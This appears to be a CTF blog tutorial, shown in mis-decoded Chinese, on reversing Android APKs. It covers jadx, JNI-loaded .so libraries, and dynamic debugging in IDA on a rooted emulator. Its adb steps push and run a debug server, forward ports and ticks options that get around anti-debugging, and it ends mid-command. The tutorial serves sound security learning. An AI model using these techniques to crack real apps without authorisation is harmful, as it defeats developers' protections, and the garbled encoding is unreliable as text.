    <content type="html"><![CDATA[<h1 id="å®‰å“-APK-é€†å‘"><a href="#å®‰å“-APK-é€†å‘" class="headerlink" title="å®‰å“ APK é€†å‘"></a>å®‰å“ APK é€†å‘</h1><blockquote><p>Android çš„é€†å‘ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªå±‚é¢ï¼š</p><ol><li>Java å±‚  </li><li>åŸç”Ÿå±‚</li></ol><p>Android é€†å‘å¸¸ç”¨å·¥å…· jadx ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/skylot/jadx">GitHub - skylot&#x2F;jadx: Dex to Java decompiler</a></p></blockquote><p>é¦–å…ˆäº†è§£ä¸€ä¸‹ Androidï¼š</p><ul><li>Android ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯ Linux çš„ä¸€ä¸ªå‘è¡Œç‰ˆï¼Œä½†ä¸æ˜¯ GNU&#x2F;Linux</li><li>Ubuntuã€Kali ç­‰ä¹Ÿæ˜¯ Linux çš„å‘è¡Œç‰ˆï¼Œä½†éƒ½æ˜¯åŸºäº GNU&#x2F;Linux çš„å‘è¡Œç‰ˆï¼Œå®ƒä»¬çš„åº”ç”¨å±‚ç”¨çš„æ˜¯ GNUï¼ˆglibcã€libstdc++ã€GNU CoreUtils ç­‰ï¼‰</li><li>ä¹Ÿå°±æ˜¯è¯´ï¼ŒAndroid å’Œ Ubuntuã€Kali ç­‰åŸºäº GNU&#x2F;Linux çš„ Linux å‘è¡Œç‰ˆæ˜¯ä¸ä¸€æ ·çš„ï¼ŒAndroid çš„åº”ç”¨å±‚æ˜¯è‡ªå·±ç‹¬æœ‰çš„ï¼Œä¸ä¾èµ–äº GNU</li></ul><hr><h2 id="Java-å±‚"><a href="#Java-å±‚" class="headerlink" title="Java å±‚"></a>Java å±‚</h2><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ç›´æ¥åˆ†æ APK çš„ <code>MainActivity</code> æ–¹æ³•ï¼Œä¸å­˜åœ¨å…¶ä»–çš„é“¾æ¥åº“è°ƒç”¨ï¼Œä¸€èˆ¬ä»…éœ€è¦æŒæ¡ Java è¯­è¨€å³å¯</p></blockquote><p>ç”¨ jadx æ‰“å¼€ apk ç¨‹åºåï¼Œä¸»è¦æ–¹æ³• <code>MainActivity</code> é€šå¸¸ä½äº <code>com.xxx.xxx</code> ä¸‹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%911.png" alt="CTF - REVERSE_Android é€†å‘1.png"></p><p>å¯¹äº <code>MainActivity</code> ä¸­çš„ä¸€äº›å­—ç¬¦ä¸²å˜é‡ï¼Œä¾‹å¦‚ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%912.png" alt="CTF - REVERSE_Android é€†å‘2.png"></p><p>è¿™é‡Œçš„ <code>C0535R.string.table</code> å¯ä»¥åœ¨å¦‚ä¸‹è·¯å¾„ä¸­æ‰¾åˆ°ï¼š<code>èµ„æºæ–‡ä»¶/resources.arsc/res/values/strings.xml</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%913.png" alt="CTF - REVERSE_Android é€†å‘3.png"></p><p>jadx åˆ†æ Android çš„ Java å±‚ä»£ç å’Œ IDA åˆ†æ C&#x2F;C++ ç¨‹åºä¸€æ ·ï¼Œä» <code>MainActivity</code> å¼€å§‹ä¸€è·¯åˆ†æå³å¯</p><blockquote><p>Android ç¨‹åº Java å±‚é€†å‘ä¾‹é¢˜è§æœ¬ç«™ <em>ã€Š<a href="%E3%80%90%E6%A5%9A%E6%85%A7%E6%9D%AF%202023%E3%80%91Level_One.md">ã€æ¥šæ…§æ¯ 2023ã€‘Level_One</a>ã€‹</em></p></blockquote><hr><h2 id="åŸç”Ÿå±‚"><a href="#åŸç”Ÿå±‚" class="headerlink" title="åŸç”Ÿå±‚"></a>åŸç”Ÿå±‚</h2><blockquote><p>åŸç”Ÿå±‚ä¹Ÿå« Native å±‚ï¼ŒæŒ‡çš„æ˜¯ Android æ“ä½œç³»ç»Ÿçš„åº•å±‚ï¼ŒåŒ…æ‹¬ Linux å†…æ ¸å’Œå„ç§ C&#x2F;C++ åº“</p><p>Native å±‚é€šå¸¸ä¼šä½¿ç”¨ <code>so</code> æ–‡ä»¶æ¥å®ç°ç›¸å…³çš„æ–¹æ³•ï¼Œæœ‰ç‚¹ç±»ä¼¼äº Linux ä¸­çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¸€èˆ¬éœ€è¦æŒæ¡ Java è¯­è¨€ã€C&#x2F;C++ è¯­è¨€ã€æ±‡ç¼–è¯­è¨€</p></blockquote><p><strong>Android çš„ apk ç¨‹åºå®è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ apk ç¨‹åºç›´æ¥è¿›è¡Œè§£å‹</strong>ï¼ˆä½¿ç”¨ 7-zip æˆ–è€… WinRAR éƒ½å¯ä»¥ï¼‰</p><p>ç„¶åä¼šå¾—åˆ°å¦‚ä¸‹ç»“æ„çš„ç›®å½•ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%914.png" alt="CTF - REVERSE_Android é€†å‘4.png"></p><p>å…¶å®ç»†å¿ƒä¸€ç‚¹å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªç›®å½•ç»“æ„å’Œ jadx ä¸­çœ‹åˆ°çš„ç»“æ„æ˜¯ä¸€æ ·çš„</p><p>è€Œ <code>so</code> æ–‡ä»¶é€šå¸¸åœ¨ <code>lib</code> æ–‡ä»¶å¤¹ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%915.png" alt="CTF - REVERSE_Android é€†å‘5.png"></p><blockquote><p><strong>ç”±äº Android ç¨‹åºéœ€è¦è€ƒè™‘é€‚é…å¸‚é¢ä¸Šä¸åŒæ‰‹æœºçš„ CPU æ¶æ„ï¼Œå› æ­¤ä¼šç”Ÿæˆæ”¯æŒä¸åŒå¹³å°çš„ <code>so</code> æ–‡ä»¶è¿›è¡Œå…¼å®¹</strong></p></blockquote><p>è¿™é‡Œæ¯ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­çš„ <code>so</code> æ–‡ä»¶å°±å¯¹åº”äº†ä¸€ä¸ª CPU æ¶æ„</p><p>å®ƒä»¬çš„å†…å®¹å‡ ä¹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåˆ†æå…¶ä¸­ä¹‹ä¸€å³å¯ï¼Œé€šå¸¸æ˜¯åœ¨ IDA ä¸­åˆ†æ <code>x86</code> æˆ– <code>x86_64</code> æ¶æ„</p><blockquote><p>Android ç¨‹åºåŸç”Ÿå±‚é€†å‘ä¾‹é¢˜è§æœ¬ç«™ <em>ã€Š<a href="%E3%80%90%E6%A5%9A%E6%85%A7%E6%9D%AF%202023%E3%80%91Level_up.md">ã€æ¥šæ…§æ¯ 2023ã€‘Level_up</a>ã€‹</em></p></blockquote><hr><h3 id="ä»€ä¹ˆæ˜¯-so"><a href="#ä»€ä¹ˆæ˜¯-so" class="headerlink" title="ä»€ä¹ˆæ˜¯ so"></a>ä»€ä¹ˆæ˜¯ so</h3><blockquote><p>ä¸ Linux ç±»ä¼¼ï¼ŒNative å±‚ä»£ç é€šå¸¸å­˜åœ¨äº <code>so</code> æ–‡ä»¶ä¸­ï¼Œ<code>so</code> æ–‡ä»¶å…¨ç§°ä¸º Shared Objectï¼Œä½¿ç”¨ <code>so</code> å¯ä»¥æé«˜å¼€å‘æ•ˆç‡ã€å¿«é€Ÿç§»æ¤</p><p>å¼€å‘ Android åº”ç”¨æ—¶ï¼Œæœ‰æ—¶å€™ Java å±‚çš„ç¼–ç ä¸èƒ½æ»¡è¶³å®ç°éœ€æ±‚ï¼Œå°±éœ€è¦ä½¿ç”¨ C&#x2F;C++ å®ç°ï¼Œç„¶åç”Ÿæˆ so æ–‡ä»¶ï¼Œå¸¸è§çš„åœºæ™¯æœ‰ï¼šåŠ è§£å¯†ç®—æ³•ã€éŸ³è§†é¢‘ç¼–è§£ç ç­‰</p></blockquote><p><code>so</code> æ–‡ä»¶çš„åŠ è½½é€šå¸¸æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li><code>loadLibrary</code> åŠ è½½ï¼ˆ<strong>ä¸»è¦ä½¿ç”¨</strong>ï¼‰</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>   <span class="token comment">// è°ƒç”¨é¡¹ç›®ä¸­ lib ç›®å½•ä¸‹çš„ libxxx.so æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€èˆ¬é€šè¿‡ JNI æ¥å®ç°</p><blockquote><p>JNI å…¨å Java Native Interfaceï¼Œæ˜¯ Java æœ¬åœ°æ¥å£</p><p>JNI æ˜¯ Java è°ƒç”¨ Native è¯­è¨€çš„ä¸€ç§ç‰¹æ€§ï¼Œé€šè¿‡ JNI å¯ä»¥ä½¿ Java ä¸ C&#x2F;C++ æœºå‹äº¤äº’ï¼Œç®€å•ç‚¹è¯´å°±æ˜¯ JNI æ˜¯ Java ä¸­è°ƒç”¨ C&#x2F;C++ çš„ç»Ÿç§°</p></blockquote><p>åœ¨ Android ä¸­ JNI çš„å®ç°ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%916.png" alt="CTF - REVERSE_Android é€†å‘6.png"></p><p>è¿™é‡Œé€šè¿‡ JNI ä» <code>libSecret_entrance.so</code> æ–‡ä»¶ä¸­è°ƒç”¨äº†ä¸¤ä¸ªæ–¹æ³•ï¼š  </p><p>â‘  <code>Java_com_example_re11113_jni_getiv(__int64 a1)</code><br>â‘¡ <code>Java_com_example_re11113_jni_getkey(__int64 a1)</code>  </p><ul><li><code>load</code> åŠ è½½ï¼ˆä¸»è¦ç”¨äºåœ¨æ’ä»¶ä¸­åŠ è½½ <code>so</code> æ–‡ä»¶ï¼‰</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>   <span class="token comment">// xxx å¯¹åº” lib çš„ç»å¯¹è·¯å¾„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="IDA-åŠ¨æ€è°ƒè¯•å®‰å“-so"><a href="#IDA-åŠ¨æ€è°ƒè¯•å®‰å“-so" class="headerlink" title="IDA åŠ¨æ€è°ƒè¯•å®‰å“ so"></a>IDA åŠ¨æ€è°ƒè¯•å®‰å“ so</h1><blockquote><p>ä½¿ç”¨ IDA åŠ¨æ€è°ƒè¯•æ„å‘³ç€æˆ‘ä»¬è¦å°† apk è¿è¡Œèµ·æ¥ï¼Œå¯ä»¥ä½¿ç”¨æ¨¡æ‹Ÿå™¨ï¼ˆå¦‚ï¼šé›·ç”µæ¨¡æ‹Ÿå™¨ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨çœŸå®çš„å®‰å“æ‰‹æœºï¼ˆå»ºè®®æ‹¥æœ‰ root æƒé™ï¼‰</p><p>å½“ç„¶æœ‰ root çš„çœŸæœºæœ€å¥½ï¼Œç”¨ Android æ¨¡æ‹Ÿå™¨æ¥åŠ¨æ€è°ƒè¯• <code>so</code> æ–‡ä»¶å¯èƒ½æ— æ³•è¿›è¡ŒæŸäº›æ­¥éª¤</p><p>adb å‘½ä»¤ä½¿ç”¨æ–¹æ³•ï¼š<a href="https://zhuanlan.zhihu.com/p/89060003">ADB å‘½ä»¤å¤§å…¨ - çŸ¥ä¹</a></p></blockquote><p>åœ¨ IDA çš„ <code>dbgsrv</code> ç›®å½•ä¸‹æœ‰è®¸å¤šè¿œç¨‹è°ƒè¯•ç”¨çš„æœåŠ¡ç¨‹åºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%917.png" alt="CTF - REVERSE_Android é€†å‘7.png"></p><p>è°ƒè¯•å®‰å“ç”¨åˆ°çš„ä¸»è¦æ˜¯ä¸Šå›¾çº¢æ¡†ä¸­çš„ç¨‹åºï¼Œä½†å®ƒä»¬ä¹Ÿæœ‰åŒºåˆ«ï¼š</p><ul><li><p><em>çœŸå®çš„å®‰å“æ‰‹æœºé€šå¸¸æ˜¯ ARM æ¶æ„ï¼Œå¯¹åº” <code>android_server</code> å’Œ <code>android_server_64</code></em></p></li><li><p><em>æ¨¡æ‹Ÿå™¨ï¼ˆå¦‚ï¼šé›·ç”µæ¨¡æ‹Ÿå™¨ï¼‰é€šå¸¸æ˜¯ x86 æ¶æ„ï¼Œå¯¹åº” <code>android_x86_server</code> å’Œ <code>android_x64_server</code></em></p></li></ul><p>æˆ‘è¿™é‡Œä¸»è¦ä»¥é›·ç”µæ¨¡æ‹Ÿå™¨ä½œä¸ºä¾‹å­</p><p>ä»¥ã€Š2024 WIDC å¤©èä¿¡æ¯ã€‹çš„ã€ŠDay2-debug ç®—æ³•é€†å‘ã€‹è¿™é“é¢˜æ¥è¯´æ˜</p><p>ç”¨ jadx æ‰“å¼€ apkï¼Œå®šä½åˆ° <code>MainActivity</code>ï¼Œä¸»è¦ä¸ <code>getFlag()</code> å‡½æ•°æœ‰å…³ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9117.png" alt="CTF - REVERSE_Android é€†å‘17.png"></p><p>å‡½æ•°çš„å®šä¹‰åœ¨ <code>libread.so</code> æ–‡ä»¶ä¸­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9118.png" alt="CTF - REVERSE_Android é€†å‘18.png"></p><p>å…³é”®åŠ å¯†é€»è¾‘åœ¨äºï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>LABEL_16<span class="token operator">:</span>    v62 <span class="token operator">=</span> v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9u</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">45</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5u</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x30</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x19u</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x19u</span> <span class="token punctuation">)</span>        v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1Au</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1Au</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v5<span class="token punctuation">[</span>v7<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v62 <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> v7 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> buff<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå¯¹ <code>v62</code> è¿›è¡Œäº†å¤„ç†ï¼Œåˆ†åˆ«å¯¹åº” <code>v62</code> ä¸º <code>0 ~ 9</code>ã€<code>a ~ z</code> å’Œ <code>A ~ Z</code> çš„æƒ…å†µï¼Œå¾ªç¯æ¬¡æ•°ä¸º <code>v6</code>ï¼Œæœ€åå°†åŠ å¯†åçš„æ•°æ®ä¸ <code>buff</code> æ¯”è¾ƒï¼Œæ˜¾ç„¶ <code>v5</code> æ˜¯æ˜æ–‡ï¼Œ<code>buff</code> æ˜¯å¯†æ–‡</p><p>ä½†æ˜¯ <code>buff</code> å¤„å¹¶æ²¡æœ‰å†…å®¹ï¼Œå› æ­¤å¯èƒ½æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œå¿…é¡»åŠ¨æ€è°ƒè¯•æ‰èƒ½æ‹¿åˆ°å¯†æ–‡</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9119.png" alt="CTF - REVERSE_Android é€†å‘19.png"></p><p>ä¸‹è½½é›·ç”µæ¨¡æ‹Ÿå™¨ï¼š<a href="https://www.ldmnq.com/">é›·ç”µå®‰å“æ¨¡æ‹Ÿå™¨-æ‰‹æ¸¸æ¨¡æ‹Ÿå™¨å®‰å“ç‰ˆ_androidæ‰‹æœºæ¨¡æ‹Ÿå™¨ç”µè„‘ç‰ˆ_é›·ç”µæ¨¡æ‹Ÿå™¨å®˜ç½‘</a></p><p><strong>é›·ç”µæ¨¡æ‹Ÿå™¨è¦å¼€å¯ root æ¨¡å¼ï¼Œå¦åˆ™ IDA æ‰¾ä¸åˆ°è¦é™„åŠ çš„è¿›ç¨‹</strong></p><p>ç„¶ååœ¨é›·ç”µæ¨¡æ‹Ÿå™¨çš„å®‰è£…è·¯å¾„ä¸‹ï¼Œæœ‰ä¸€ä¸ª <code>adb.exe</code> ç¨‹åºï¼Œæˆ‘è¿™é‡Œæ˜¯ <code>D:\leidian\LDPlayer9</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%919.png" alt="CTF - REVERSE_Android é€†å‘9.png"></p><p>å°†è¯¥è·¯å¾„åŠ å…¥ç¯å¢ƒå˜é‡ï¼Œä¾¿å¯ä»¥åœ¨ CMD ä¸­ç›´æ¥ä½¿ç”¨ <code>adb</code> å‘½ä»¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%918.png" alt="CTF - REVERSE_Android é€†å‘8.png"></p><p>å°† apk ç¨‹åºå®‰è£…åˆ°é›·ç”µæ¨¡æ‹Ÿå™¨ï¼Œå¹¶ä¿è¯å…¶å¯ä»¥æ­£å¸¸è¿è¡Œï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9110.png" alt="CTF - REVERSE_Android é€†å‘10.png"></p><p>åœ¨ IDA çš„ <code>dbgsrv</code> ç›®å½•ä¸‹æ‰“å¼€ CMD</p><p>æµ‹è¯•ä¸€ä¸‹æ˜¯å¦èƒ½è¿æ¥åˆ°é›·ç”µæ¨¡æ‹Ÿå™¨ï¼šï¼ˆ**ä¸€èˆ¬åªè¦å®‰å“è®¾å¤‡è¿æ¥æ­£ç¡®ï¼Œä¼šè‡ªåŠ¨å¯åŠ¨ <code>adb server</code>**ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb devices<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9111.png" alt="CTF - REVERSE_Android é€†å‘11.png"></p><p>ä»¥ root æƒé™è¿è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9112.png" alt="CTF - REVERSE_Android é€†å‘12.png"></p><p>å°† IDA çš„ Android è°ƒè¯•æœåŠ¡ç¨‹åºæ¨é€åˆ°é›·ç”µæ¨¡æ‹Ÿå™¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb push android_x64_server /data/local/tmp   <span class="token comment"># ä¹Ÿå¯ä»¥é€‰æ‹©æ¨é€åˆ°å…¶ä»–è·¯å¾„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9113.png" alt="CTF - REVERSE_Android é€†å‘13.png"></p><blockquote><p>æ³¨æ„è¿™é‡Œ IDA çš„ <code>server</code> è¦é€‰å¯¹ï¼Œ64 ä½é›·ç”µæ¨¡æ‹Ÿå™¨ä¸€èˆ¬é€‰æ‹© <code>android_x64_server</code></p></blockquote><p>é€šè¿‡ shell è¿æ¥é›·ç”µæ¨¡æ‹Ÿå™¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ° <code>/data/local/tmp</code> ç›®å½•ä¸‹èµ‹äºˆ <code>android_x64_server</code> æ‰§è¡Œæƒé™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /data/local/tmp <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token function">chmod</span> <span class="token number">777</span> android_x64_server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9114.png" alt="CTF - REVERSE_Android é€†å‘14.png"></p><p>è¿è¡Œ <code>android_x64_server</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./android_x64_server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9115.png" alt="CTF - REVERSE_Android é€†å‘15.png"></p><p>å¦‚æœ <code>android_x64_server</code> åœ¨ 23946 ç«¯å£æ­£å¸¸å¼€å¯ç›‘å¬ï¼Œè¯´æ˜ä¸€åˆ‡æ­£å¸¸</p><p>å¦å¤–å¼€å¯ä¸€ä¸ª CMDï¼Œå°†é›·ç”µæ¨¡æ‹Ÿå™¨çš„ç«¯å£è½¬å‘åˆ°æœ¬æœºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb forward tcp:23946 tcp:23946   <span class="token comment"># å‰é¢æ˜¯ç”µè„‘æœ¬æœºçš„ç«¯å£ï¼Œåé¢æ˜¯æ‰‹æœºçš„ç«¯å£</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ºäº†è®© IDA èƒ½å¤Ÿå‘ç°è¯¥ APPï¼Œåœ¨è°ƒè¯•æ¨¡å¼æ‰“å¼€ APPï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell am start <span class="token parameter variable">-D</span> <span class="token parameter variable">-n</span>  com.ctf.read/com.ctf.read.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…·ä½“åç§°å¯ä»¥åœ¨ <code>èµ„æºæ–‡ä»¶/AndroidManifest.xml</code> ä¸­æŸ¥çœ‹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9116.png" alt="CTF - REVERSE_Android é€†å‘16.png"></p><p>é›·ç”µæ¨¡æ‹Ÿå™¨ä¼šå¼¹å‡ºç­‰å¾…è°ƒè¯•çš„å¼¹çª—ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9120.png" alt="CTF - REVERSE_Android é€†å‘20.png"></p><p>åœ¨ IDA ä¸­ä½¿ç”¨è¿œç¨‹ Linux è°ƒè¯•å™¨ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9121.png" alt="CTF - REVERSE_Android é€†å‘21.png"></p><p>ä¸ºäº†é˜²æ­¢ apk åè°ƒè¯•ï¼Œå‹¾é€‰ä¸‹å›¾ä¸­ä¸‰ä¸ªè°ƒè¯•é€‰é¡¹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9122.png" alt="CTF - REVERSE_Android é€†å‘22.png"></p><p><code>Hostname</code> è®¾ç½®ä¸º 127.0.0.1ï¼Œ<code>Port</code> è®¾ç½®ä¸ºå‰é¢è½¬å‘åˆ°æœ¬æœºçš„ç«¯å£å·ï¼Œæˆ‘è¿™é‡Œæ˜¯ 23946</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9123.png" alt="CTF - REVERSE_Android é€†å‘23.png"></p><blockquote><p>å¦‚æœæŠ¥é”™æ˜¾ç¤ºæ‹’ç»è¿æ¥ï¼Œæ£€æŸ¥è½¬å‘ç«¯å£å·æ˜¯å¦æ­£ç¡®ï¼Œæˆ–è€…é‡æ–°è½¬å‘ä¸€æ¬¡</p></blockquote><p>ç”±äº so æ–‡ä»¶æ— æ³•å•ç‹¬è¿è¡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ <code>attach</code> é™„åŠ è¿›ç¨‹</p><p>å¦‚æœå‰é¢æ²¡å‡ºé”™çš„è¯ï¼Œåœ¨ IDA çš„ <code>attach</code> åˆ—è¡¨é‡Œæ˜¯å¯ä»¥çœ‹åˆ°è¯¥è¿›ç¨‹çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9124.png" alt="CTF - REVERSE_Android é€†å‘24.png"></p><p>æ‰¾åˆ° <code>buff</code> å­˜æ”¾çš„åœ°å€ï¼š<code>0x7FFF5A3772A0</code>ï¼Œåˆå§‹æ—¶æœªå®šä¹‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9125.png" alt="CTF - REVERSE_Android é€†å‘25.png"></p><p>è®¾ç½® jdwp è°ƒè¯•ç«¯å£</p><p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é›·ç”µæ¨¡æ‹Ÿå™¨ä¸­è¯¥ç¨‹åºçš„ç«¯å£å·ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell <span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9126.png" alt="CTF - REVERSE_Android é€†å‘26.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb forward tcp:8700 jdwp:3047   <span class="token comment"># æ³¨æ„å°† 3047 ç«¯å£å·ä¿®æ”¹ä¸ºè‡ªå·±çš„</span>jdb <span class="token parameter variable">-connect</span> <span class="token 